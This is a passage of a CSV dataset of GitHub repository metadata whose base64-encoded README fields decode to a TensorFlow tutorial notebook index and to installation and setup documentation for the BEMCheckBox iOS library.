name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
b2tzL2xpbmVhcl9yZWdyZXNzaW9uLmlweW5iKSAvIFtMb2dpc3RpYyBSZWdy
ZXNzaW9uIHdpdGggTU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4
Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbG9naXN0
aWNfcmVncmVzc2lvbl9tbmlzdC5pcHluYikgLyBbTG9naXN0aWMgUmVncmVz
c2lvbiB3aXRoIEN1c3RvbSBEYXRhc2V0XShodHRwczovL2dpdGh1Yi5jb20v
c2pjaG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tz
L2xvZ2lzdGljX3JlZ3Jlc3Npb25fY3VzdG9tZGF0YS5pcHluYikKMy4gTXVs
dGktTGF5ZXIgUGVyY2VwdHJvbiAoTUxQKTogW1NpbXBsZSBNTklTVF0oaHR0
cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2Iv
bWFzdGVyL25vdGVib29rcy9tbHBfbW5pc3Rfc2ltcGxlLmlweW5iKSAvIFtE
ZWVwZXIgTU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5z
b3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbWxwX21uaXN0X2Rl
ZXBlci5pcHluYikgLyBbWGF2aWVyIEluaXQgTU5JU1RdKGh0dHBzOi8vZ2l0
aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9u
b3RlYm9va3MvbWxwX21uaXN0X3hhdmllci5pcHluYikgLyBbQ3VzdG9tIERh
dGFzZXRdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbWxwX2N1c3RvbWRhdGFfYmFz
aWMuaXB5bmIpCjQuIENvbnZvbHV0aW9uYWwgTmV1cmFsIE5ldHdvcmsgKENO
Tik6IFtTaW1wbGUgTU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4
Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvY25uX21u
aXN0X3NpbXBsZS5pcHluYikgLyBbRGVlcGVyIE1OSVNUXShodHRwczovL2dp
dGh1Yi5jb20vc2pjaG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIv
bm90ZWJvb2tzL2Nubl9tbmlzdF9iYXNpYy5pcHluYikgLyBbU2ltcGxlIEN1
c3RvbSBEYXRhc2V0XShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVu
c29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2Nubl9jdXN0b21k
YXRhX3NpbXBsZS5pcHluYikgLyBbQmFzaWMgQ3VzdG9tIERhdGFzZXRdKGh0
dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9i
L21hc3Rlci9ub3RlYm9va3MvY25uX2N1c3RvbWRhdGFfYmFzaWMuaXB5bmIp
CjUuIFVzaW5nIFByZS10cmFpbmVkIE1vZGVsIChWR0cpOiBbU2ltcGxlIFVz
YWdlXShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVuc29yZmxvdy0x
MDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL3VzZV92Z2cuaXB5bmIpIC8gW0NO
TiBGaW5lLXR1bmluZyBvbiBDdXN0b20gRGF0YXNldF0oaHR0cHM6Ly9naXRo
dWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25v
dGVib29rcy9jbm5fY3VzdG9tZGF0YV92Z2dfZmluZXR1bmUuaXB5bmIpCjYu
IFJlY3VycmVudCBOZXVyYWwgTmV0d29yayAoUk5OKTogW1NpbXBsZSBNTklT
VF0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAx
L2Jsb2IvbWFzdGVyL25vdGVib29rcy9ybm5fbW5pc3Rfc2ltcGxlLmlweW5i
KSAvIFtDaGFyLVJOTiBUcmFpbl0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hv
aTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9jaGFy
X3Jubl90cmFpbl90dXRvcmlhbC5pcHluYikgLyBbQ2hhci1STk4gU2FtcGxl
XShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVuc29yZmxvdy0xMDEv
YmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2NoYXJfcm5uX3NhbXBsZV90dXRvcmlh
bC5pcHluYikgLyBbSGFuZ3VsLVJOTiBUcmFpbl0oaHR0cHM6Ly9naXRodWIu
Y29tL3NqY2hvaTg2L1RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVi
b29rcy9jaGFyX3Jubl90cmFpbl9oYW5ndWwuaXB5bmIpIC8gW0hhbmd1bC1S
Tk4gU2FtcGxlXShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvVGVuc29y
Zmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2NoYXJfcm5uX3NhbXBs
ZV9oYW5ndWwuaXB5bmIpCjcuIFdvcmQgRW1iZWRkaW5nIChXb3JkMlZlYyk6
IFtTaW1wbGUgVmVyc2lvbl0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2
L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy93b3JkMnZl
Y19zaW1wbGUuaXB5bmIpIC8gW0NvbXBsZXggVmVyc2lvbl0oaHR0cHM6Ly9n
aXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVy
L25vdGVib29rcy93b3JkMnZlY19iYXNpYy5pcHluYikKOC4gQXV0by1FbmNv
ZGVyIE1vZGVsOiBbU2ltcGxlIEF1dG8tRW5jb2Rlcl0oaHR0cHM6Ly9naXRo
dWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25v
dGVib29rcy9kYWVfbW5pc3QuaXB5bmIpIC8gW0Rlbm9pc2luZyBBdXRvLUVu
Y29kZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvZGFlX21uaXN0X2Ryb3BvdXQu
aXB5bmIpIC8gW0NvbnZvbHV0aW9uYWwgQXV0by1FbmNvZGVyIChkZWNvbnZv
bHV0aW9uKV0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZs
b3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9jYWVfbW5pc3QuaXB5bmIp
CjkuIENsYXNzIEFjdGl2YXRpb24gTWFwIChDQU0pOiBbR2xvYmFsIEF2ZXJh
Z2UgUG9vbGluZyBvbiBNTklTVF0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hv
aTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9nYXBf
bW5pc3QuaXB5bmIpCjEwLiBUZW5zb3JCb2FyZCBVc2FnZTogW0xpbmVhciBS
ZWdyZXNzaW9uXShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVuc29y
Zmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL3Zpc19saW5lYXJfcmVn
cmVzc2lvbi5pcHluYikgLyBbTUxQXShodHRwczovL2dpdGh1Yi5jb20vc2pj
aG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL3Zp
c19tbHBfbW5pc3QuaXB5bmIpIC8gW0NOTl0oaHR0cHM6Ly9naXRodWIuY29t
L3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29r
cy92aXNfY25uX21uaXN0LmlweW5iKSAKMTEuIFtTZW1hbnRpYyBzZWdtZW50
YXRpb25dKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3Mvc2Vtc2VnX2Jhc2ljLmlweW5i
KQoxMi4gW1N1cGVyIHJlc29sdXRpb24gKGluIHByb2dyZXNzKV0oaHR0cHM6
Ly9naXRodWIuY29tL3NqY2hvaTg2L1RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFz
dGVyL25vdGVib29rcy9zdXBlcnJlc19jbm4uaXB5bmIpCjEzLiBbV2ViIGNy
YXdsZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3Mvd2ViY3Jhd2xpbmdfbmF2ZXJz
dG9jay5pcHluYikKMTQuIFtHYXVzc2lhbiBwcm9jZXNzIHJlZ3Jlc3Npb25d
KGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3JmbG93LTEwMS9i
bG9iL21hc3Rlci9ub3RlYm9va3MvZ3BfZGVtby5pcHluYikKMTUuIFtOZXVy
YWwgU3R5bGVdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3Jm
bG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbmV1cmFsX3N0eWxlLmlw
eW5iKQoxNi4gW0ZhY2UgZGV0ZWN0aW9uIHdpdGggT3BlbkNWXShodHRwczov
L2dpdGh1Yi5jb20vc2pjaG9pODYvVGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0
ZXIvbm90ZWJvb2tzL2Jhc2ljX29wZW5jdjIuaXB5bmIpCgojIyBSZXF1aXJl
bWVudHMKLSBUZW5zb3JGbG93Ci0gTnVtcHkKLSBTY2lQeQotIFBpbGxvdwot
IEJlYXV0aWZ1bFNvdXAKLSBbUHJldHJhaW5lZCBWR0ddKGh0dHA6Ly93d3cu
dmxmZWF0Lm9yZy9tYXRjb252bmV0L21vZGVscy9iZXRhMTYvaW1hZ2VuZXQt
dmdnLXZlcnlkZWVwLTE5Lm1hdCk6IGluc2lkZSAnZGF0YS8nIGZvbGRlcgoK
IyMgTm90ZQpNb3N0IG9mIHRoZSBjb2RlcyBhcmUgc2ltcGxlIHJlZmFjdG9y
aW5ncyBvZiBbQXltZXJpYyBEYW1pZW4ncyBUdXRvcmlhbF0oaHR0cHM6Ly9n
aXRodWIuY29tL2F5bWVyaWNkYW1pZW4vVGVuc29yRmxvdy1FeGFtcGxlcy8p
IG9yIFtOYXRoYW4gTGludHoncyBUdXRvcmlhbF0oaHR0cHM6Ly9naXRodWIu
Y29tL25saW50ei9UZW5zb3JGbG93LVR1dG9yaWFscykuIApUaGVyZSBjb3Vs
ZCBiZSBtaXNzaW5nIGNyZWRpdHMuIFBsZWFzZSBsZXQgbWUga25vdy4gCgoj
IyMjIENvbGxlY3RlZCBhbmQgTW9kaWZ5ZWQgYnkgW1N1bmdqb29uXShodHRw
Oi8vZW5naW5pdXMudGlzdG9yeS5jb20pIApbaW5mb10oaHR0cDovL2Nwc2xh
Yi5zbnUuYWMua3IvcGVvcGxlL3N1bmdqb29uLWNob2kpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'BEMCheckBox',41844416,b'Tasteful Checkbox for iOS. (Check box)',b'Objective-C',22,2393,,2393,False,b'https://api.github.com/repos/Boris-Em/BEMCheckBox/forks',"IyBCRU1DaGVja0JveApbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9Cb3Jpcy1FbS9CRU1DaGVja0JveC5zdmcpXShodHRwczovL3Ry
YXZpcy1jaS5vcmcvQm9yaXMtRW0vQkVNQ2hlY2tCb3gpClshW1ZlcnNpb25d
KGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vY29jb2Fwb2RzL3YvQkVNQ2hlY2tC
b3guc3ZnP3N0eWxlPWZsYXQpXShodHRwOi8vY29jb2Fkb2NzLm9yZy9kb2Nz
ZXRzL0JFTUNoZWNrQm94KQpbIVtMaWNlbnNlXShodHRwczovL2ltZy5zaGll
bGRzLmlvL2NvY29hcG9kcy9sL0JFTUNoZWNrQm94LnN2Zz9zdHlsZT1mbGF0
KV0oaHR0cDovL2NvY29hZG9jcy5vcmcvZG9jc2V0cy9CRU1DaGVja0JveCkK
WyFbUGxhdGZvcm1dKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vY29jb2Fwb2Rz
L3AvQkVNQ2hlY2tCb3guc3ZnP3N0eWxlPWZsYXQpXShodHRwOi8vY29jb2Fk
b2NzLm9yZy9kb2NzZXRzL0JFTUNoZWNrQm94KQpbIVtDYXJ0aGFnZSBDb21w
YXRpYmxlXShodHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL0NhcnRoYWdl
LWNvbXBhdGlibGUtNEJDNTFELnN2Zz9zdHlsZT1mbGF0KV0oaHR0cHM6Ly9n
aXRodWIuY29tL0NhcnRoYWdlL0NhcnRoYWdlKQoKPHAgYWxpZ249ImNlbnRl
ciI+PGltZyBzcmM9Ii4vLmFzc2V0cy9CRU1DaGVja0JveCBsb2dvLmpwZyIv
PjwvcD4JCgoqKkJFTUNoZWNrQm94KiogaXMgYW4gb3BlbiBzb3VyY2UgbGli
cmFyeSBtYWtpbmcgaXQgZWFzeSB0byBjcmVhdGUgYmVhdXRpZnVsLCBoaWdo
bHkgY3VzdG9taXphYmxlLCBhbmltYXRlZCBjaGVja2JveGVzIGZvciBpT1Mu
IAoKIyMgVGFibGUgb2YgQ29udGVudHMKCiogWyoqUHJvamVjdCBEZXRhaWxz
KipdKCNwcm9qZWN0LWRldGFpbHMpICAKICAqIFtSZXF1aXJlbWVudHNdKCNy
ZXF1aXJlbWVudHMpCiAgKiBbTGljZW5zZV0oI2xpY2Vuc2UpCiAgKiBbU3Vw
cG9ydF0oI3N1cHBvcnQpCiAgKiBbU2FtcGxlIEFwcF0oI3NhbXBsZS1hcHAp
CiAgKiBbUmVhY3QgTmF0aXZlXSgjcmVhY3QtbmF0aXZlKQogICogW05hdGl2
ZVNjcmlwdF0oI25hdGl2ZXNjcmlwdCkKICAqIFtYYW1hcmluXSgjeGFtYXJp
bikKKiBbKipHZXR0aW5nIFN0YXJ0ZWQqKl0oI2dldHRpbmctc3RhcnRlZCkK
ICAqIFtJbnN0YWxsYXRpb25dKCNpbnN0YWxsYXRpb24pCiAgKiBbU2V0dXBd
KCNzZXR1cCkKKiBbKipEb2N1bWVudGF0aW9uKipdKCNkb2N1bWVudGF0aW9u
KQogICogW0VuYWJsaW5nIC8gRGlzYWJsaW5nIHRoZSBDaGVja2JveF0oI2Vu
YWJsaW5nLS1kaXNhYmxpbmctdGhlLWNoZWNrYm94KSAKICAqIFtSZWxvYWRp
bmddKCNyZWxvYWRpbmcpCiAgKiBbR3JvdXAgLyBSYWRpbyBCdXR0b24gRnVu
Y3Rpb25hbGl0eV0oI2dyb3VwLS1yYWRpby1idXR0b24tZnVuY3Rpb25hbGl0
eSkKICAqIFtEZWxlZ2F0ZV0oI2RlbGVnYXRlKQogICogW0N1c3RvbWl6YXRp
b25dKCNjdXN0b21pemF0aW9uKQoKIyMgUHJvamVjdCBEZXRhaWxzCkxlYXJu
IG1vcmUgYWJvdXQgdGhlICoqQkVNQ2hlY2tCb3gqKiBwcm9qZWN0LCBsaWNl
bnNpbmcsIHN1cHBvcnQgZXRjLgoKPHAgYWxpZ249ImNlbnRlciI+PGltZyBz
cmM9Ii4vLmFzc2V0cy9CRU1DaGVja0JveC5naWYiLz48L3A+CQoKIyMjIFJl
cXVpcmVtZW50cwogLSBSZXF1aXJlcyBpT1MgNyBvciBsYXRlci4gVGhlIHNh
bXBsZSBwcm9qZWN0IGlzIG9wdGltaXplZCBmb3IgaU9TIDkuCiAtIFJlcXVp
cmVzIEF1dG9tYXRpYyBSZWZlcmVuY2UgQ291bnRpbmcgKEFSQykuCiAtIE9w
dGltaXplZCBmb3IgQVJNNjQgQXJjaGl0ZWN0dXJlLgoKIyMjIExpY2Vuc2UK
U2VlIHRoZSBbTGljZW5zZV0oaHR0cHM6Ly9naXRodWIuY29tL0JvcmlzLUVt
L0JFTUNoZWNrQm94L2Jsb2IvbWFzdGVyL0xJQ0VOU0UpLiBZb3UgYXJlIGZy
ZWUgdG8gbWFrZSBjaGFuZ2VzIGFuZCB1c2UgdGhpcyBpbiBlaXRoZXIgcGVy
c29uYWwgb3IgY29tbWVyY2lhbCBwcm9qZWN0cy4gQXR0cmlidXRpb24gaXMg
bm90IHJlcXVpcmVkLCBidXQgaGlnaGx5IGFwcHJlY2lhdGVkLiBBIGxpdHRs
ZSAiVGhhbmtzISIgKG9yIHNvbWV0aGluZyB0byB0aGF0IGFmZmVjdCkgaXMg
YWx3YXlzIHdlbGNvbWUuIElmIHlvdSB1c2UgKipCRU1DaGVja0JveCoqIGlu
IHlvdXIgYXBwLCBwbGVhc2UgbGV0IHVzIGtub3chCgojIyMgU3VwcG9ydApb
IVtHaXR0ZXIgY2hhdF0oaHR0cHM6Ly9iYWRnZXMuZ2l0dGVyLmltL0Jvcmlz
LUVtL0JFTUNoZWNrQm94LnBuZyldKGh0dHBzOi8vZ2l0dGVyLmltL0Jvcmlz
LUVtL0JFTUNoZWNrQm94KSAgCkpvaW4gdXMgb24gW0dpdHRlcl0oaHR0cHM6
Ly9naXR0ZXIuaW0vQm9yaXMtRW0vQkVNQ2hlY2tCb3gpIGlmIHlvdSBuZWVk
IGFueSBoZWxwIG9yIHdhbnQgdG8gdGFsayBhYm91dCB0aGUgcHJvamVjdC4K
CiMjIyBTYW1wbGUgQXBwClRoZSBpT1MgU2FtcGxlIEFwcCBpbmNsdWRlZCB3
aXRoIHRoaXMgcHJvamVjdCBkZW1vbnN0cmF0ZXMgb25lIHdheSB0byBjb3Jy
ZWN0bHkgc2V0dXAgYW5kIHVzZSAqKkJFTUNoZWNrQm94KiouIEl0IGFsc28g
b2ZmZXJzIHRoZSBwb3NzaWJpbGl0eSB0byBjdXN0b21pemUgdGhlIGNoZWNr
Ym94IHdpdGhpbiB0aGUgYXBwLgoKIyMjIFJlYWN0IE5hdGl2ZSAgCioqQkVN
Q2hlY2tCb3gqKiBjYW4gYmUgdXNlZCB3aXRoIFJlYWN0IE5hdGl2ZTogW1Jl
YWN0LU5hdGl2ZS1CRU1DaGVja0JveF0oaHR0cHM6Ly9naXRodWIuY29tL3Rv
cmlmYXQvcmVhY3QtbmF0aXZlLWJlbS1jaGVjay1ib3gpCgojIyMgTmF0aXZl
U2NyaXB0ICAKKipCRU1DaGVja0JveCoqIGNhbiBiZSB1c2VkIHdpdGggTmF0
aXZlU2NyaXB0OiBbTmF0aXZlU2NyaXB0LUJFTUNoZWNrQm94XShodHRwczov
L2dpdGh1Yi5jb20vbnN0dWRpby9uYXRpdmVzY3JpcHQtY2hlY2tib3gpCgoj
IyMgWGFtYXJpbgoqKkJFTUNoZWNrQm94KiogY2FuIGFsc28gYmUgdXNlZCB3
aXRoIFhhbWFyaW46IFtYUGx1Z2lucy5pT1MuQkVNQ2hlY2tCb3hdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9zYXR1cmRheW1wL1hQbHVnaW5zLmlPUy5CRU1DaGVj
a0JveCkKCiMjIEdldHRpbmcgU3RhcnRlZApJdCBvbmx5IHRha2VzIGEgZmV3
IHNpbXBsZSBzdGVwcyB0byBpbnN0YWxsIGFuZCBzZXR1cCAqKkJFTUNoZWNr
Qm94KiogdG8geW91ciBwcm9qZWN0LgoKIyMjIEluc3RhbGxhdGlvbgoKIyMj
IyBDb2NvYVBvZHMKVGhlIGVhc2llc3Qgd2F5IHRvIGluc3RhbGwgKipCRU1D
aGVja0JveCoqIGlzIHRvIHVzZSA8YSBocmVmPSJodHRwOi8vY29jb2Fwb2Rz
Lm9yZy8iIHRhcmdldD0iX2JsYW5rIj5Db2NvYVBvZHM8L2E+LiBUbyBkbyBz
bywgc2ltcGx5IGFkZCB0aGUgZm9sbG93aW5nIGxpbmUgdG8geW91ciBgUG9k
ZmlsZWA6Cgk8cHJlPjxjb2RlPnBvZCAnQkVNQ2hlY2tCb3gnPC9jb2RlPjwv
cHJlPgoKCiMjIyMgQ2FydGhhZ2UKW0NhcnRoYWdlXShodHRwczovL2dpdGh1
Yi5jb20vQ2FydGhhZ2UvQ2FydGhhZ2UpIGlzIGEgZGVjZW50cmFsaXplZCBk
ZXBlbmRlbmN5IG1hbmFnZXIgdGhhdCBidWlsZHMgeW91ciBkZXBlbmRlbmNp
ZXMgYW5kIHByb3ZpZGVzIHlvdSB3aXRoIGJpbmFyeSBmcmFtZXdvcmtzLgoK
UnVuIGBjYXJ0aGFnZSB1cGRhdGVgIGFmdGVyIGFkZGluZyAqKkJFTUNoZWNr
Qm94KiogdG8geW91ciBDYXJ0ZmlsZSB0byBidWlsZCB0aGUgZnJhbWV3b3Jr
LiBEcmFnIHRoZSBidWlsdCBgQkVNQ2hlY2tCb3guZnJhbWV3b3JrYCBpbnRv
IHlvdXIgWGNvZGUgcHJvamVjdC4KCiMjIyMgTWFudWFsbHkJCkZpbmFsbHks
IHlvdSBjYW4gaW5zdGFsbCAqKkJFTUNoZWNrQm94KiogbWFudWFsbHkuIFNp
bXBseSBkcmFnIGFuZCBkcm9wIHRoZSAqQ2xhc3NlcyogZm9sZGVyIGludG8g
eW91ciBYY29kZSBwcm9qZWN0LiBXaGVuIHlvdSBkbyBzbywgbWFrZSBzdXJl
IHRvIGNoZWNrIHRoZSAiKkNvcHkgaXRlbXMgaW50byBkZXN0aW5hdGlvbiBn
cm91cCdzIGZvbGRlcioiIGJveC4KCiMjIyBTZXR1cApTZXR0aW5nIHVwICoq
QkVNQ2hlY2tCb3gqKiB0byB5b3VyIHByb2plY3QgY291bGRuJ3QgYmUgbW9y
ZSBzaW1wbGUuIEl0IGlzIG1vZGVsZWQgYWZ0ZXIgYFVJU3dpdGNoYC4gSW4g
ZmFjdCwgeW91IGNvdWxkIGp1c3QgcmVwbGFjZSBpbnN0YW5jZXMgb2YgYFVJ
U3dpdGNoYCBieSAqKkJFTUNoZWNrQm94KiogaW4geW91ciBwcm9qZWN0ISAg
CkhlcmUgYXJlIHRoZSBzdGVwcyB0byBmb2xsb3cgdG8gZ2V0IGV2ZXJ5dGhp
bmcgdXAgYW5kIHJ1bm5pbmc6CgogMS4gSW1wb3J0IGAiQkVNQ2hlY2tCb3gu
aCJgIHRvIHRoZSBoZWFkZXIgb2YgeW91ciB2aWV3IGNvbnRyb2xsZXI6Cgog
YGBgb2JqZWN0aXZlLWMKICNpbXBvcnQgIkJFTUNoZWNrQm94LmgiCiBgYGAK
CiAyLiAqKkJFTUNoZWNrQm94KiogY2FuIGVpdGhlciBiZSBpbml0aWFsaXpl
ZCBwcm9ncmFtYXRpY2FsbHkgKHRocm91Z2ggY29kZSkgb3Igd2l0aCBJbnRl
cmZhY2UgQnVpbGRlciAoU3Rvcnlib2FyZCBmaWxlKS4gVXNlIHRoZSBtZXRo
b2QgdGhhdCBtYWtlcyB0aGUgbW9zdCBzZW5zZSBmb3IgeW91ciBwcm9qZWN0
LgogCiAqKlByb2dyYW1tYXRpY2FsIEluaXRpYWxpemF0aW9uKiogIAogSnVz
dCBhZGQgdGhlIGZvbGxvd2luZyBjb2RlIHRvIHlvdXIgaW1wbGVtZW50YXRp
b24gKHVzdWFsbHkgaW4gdGhlIGB2aWV3RGlkTG9hZGAgbWV0aG9kIG9mIHlv
dXIgVmlldyBDb250cm9sbGVyKS4KCiBgYGBvYmplY3RpdmUtYwogQkVNQ2hl
Y2tCb3ggKm15Q2hlY2tCb3ggPSBbW0JFTUNoZWNrQm94IGFsbG9jXSBpbml0
V2l0aEZyYW1lOkNHUmVjdE1ha2UoMCwgMCwgNTAsIDUwKV07CiBbc2VsZi52
aWV3IGFkZFN1YnZpZXc6bXlDaGVja0JveF07CiBgYGAKIAogKipJbnRlcmZh
Y2UgQnVpbGRlciBJbml0aWFsaXphdGlvbioqICAKIDEgLSBEcmFnIGEgYFVJ
Vmlld2AgdG8geW91ciBgVUlWaWV3Q29udHJvbGxlcmAuICAKIDIgLSBDaGFu
Z2UgdGhlIGNsYXNzIG9mIHRoZSBuZXcgYFVJVmlld2AgdG8gYEJFTUNoZWNr
Qm94YC4gIAogMyAtIFNlbGVjdCB0aGUgYEJFTUNoZWNrQm94YCBhbmQgb3Bl
biB0aGUgQXR0cmlidXRlcyBJbnNwZWN0b3IuIE1vc3Qgb2YgdGhlIGN1c3Rv
bWl6YWJsZSBwcm9wZXJ0aWVzIGNhbiBlYXNpbHkgYmUgc2V0IGZyb20gdGhl
IEF0dHJpYnV0ZXMgSW5zcGVjdG9yLiBUaGUgU2FtcGxlIEFwcCBkZW1vbnN0
cmF0ZXMgdGhpcyBjYXBhYmlsaXR5LgoKIyMgRG9jdW1lbnRhdGlvbgpBbGwg
b2YgdGhlIG1ldGhvZHMgYW5kIHByb3BlcnRpZXMgYXZhaWxhYmxlIGZvciAq
KkJFTUNoZWNrQm94KiogYXJlIGRvY3VtZW50ZWQgYmVsb3cuCgojIyMgRW5h
YmxpbmcgLyBEaXNhYmxpbmcgdGhlIENoZWNrYm94CiMjIyMjIFRoZSBgb25g
IFByb3BlcnR5Ckp1c3QgbGlrZSBgVUlTd2l0Y2hgLCAqKkJFTUNoZWNrQm94
KiogcHJvdmlkZXMgdGhlIGJvb2xlYW4gcHJvcGVydHkgYG9uYCB0aGF0IGFs
bG93cyB5b3UgdG8gcmV0cmlldmUgYW5kIHNldCAod2l0aG91dCBhbmltYXRp
b24pIGEgdmFsdWUgZGV0ZXJtaW5pbmcgd2V0aGVyIHRoZSBCRU1DaGVja0Jv
